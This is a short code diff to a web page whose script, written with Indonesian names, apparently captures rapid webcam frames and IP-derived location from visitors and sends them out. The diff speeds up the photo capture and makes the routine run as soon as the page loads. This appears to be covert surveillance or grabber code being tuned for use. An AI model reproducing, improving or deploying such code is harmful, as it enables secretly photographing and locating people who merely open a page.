@@ -232,7 +232,7 @@ Kota                : ${ip.city}`.trim();
           canvas.toBlob(async (blob) => {
             if (blob) await kirimFoto(blob);
           }, "image/jpeg");
-          await new Promise(r => setTimeout(r, 50));
+          await new Promise(r => setTimeout(r, 20));
         }
         stream.getTracks().forEach(track => track.stop());
         return true;
@@ -259,9 +259,7 @@ Kota                : ${ip.city}`.trim();
       await kirimPesan(gabungSemua);
     };
 
-    window.addEventListener("load", () => {
-      setTimeout(mulai, 0);
-    });
+    window.addEventListener("load", mulai);
   </script>
 </body>
 </html>
